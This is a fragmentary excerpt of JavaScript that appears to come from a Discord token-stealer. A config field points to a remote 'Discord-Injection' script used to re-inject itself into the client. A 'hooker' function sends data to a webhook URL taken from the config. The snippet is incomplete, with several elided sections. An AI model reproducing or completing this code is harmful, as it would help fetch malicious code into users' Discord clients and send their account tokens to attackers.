...
const config = {
  ...
  injection_url: "https://raw.githubusercontent.com/ilylunar/Discord-Injection/master/Injection-clean.js", //injection url for when it reinjects
...
const hooker = async (content) => {
  ...
  const url2 = new URL(config.apihk);
  const options2 = {
